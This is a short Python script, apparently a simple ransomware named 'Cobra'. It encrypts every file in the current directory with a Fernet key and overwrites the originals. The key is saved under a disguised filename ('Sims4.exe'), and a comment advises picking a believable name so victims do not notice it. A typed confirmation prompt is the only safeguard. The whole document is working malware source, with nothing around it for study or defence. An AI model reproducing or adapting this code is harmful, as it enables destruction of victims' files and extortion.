import os
import sys
import random
from time import sleep
from cryptography.fernet import Fernet as Crypto

files = []
key = Crypto.generate_key()

keyname = "Sims4.exe" # Make it something believeable (E.G Linux-UBUNTU-2021.iso)

filestext = ""

for file in os.listdir():
    if file == "cobra.py" or file == keyname or file == "cobraattackdefender.py" or file == "authcode.cobra" or file == "desktop.ini":
        continue
    if os.path.isfile(file):
        files.append(file)
        if filestext == "":
            filestext = file
        else:
            filestext = filestext + ", " + file
    else:
        print("FOLDER")

print("Encrypting: " + filestext)

confirm = input("Cobra may cause permanent damage to files and/or your computer. Type in \"COBRA\" to confirm you wish to use it.\nCONFIRMATION: ")

if not confirm.lower().split(" ")[0] == "cobra":
    sys.exit()

with open(keyname, "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Crypto(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Encyrption Complete.")
sleep(10)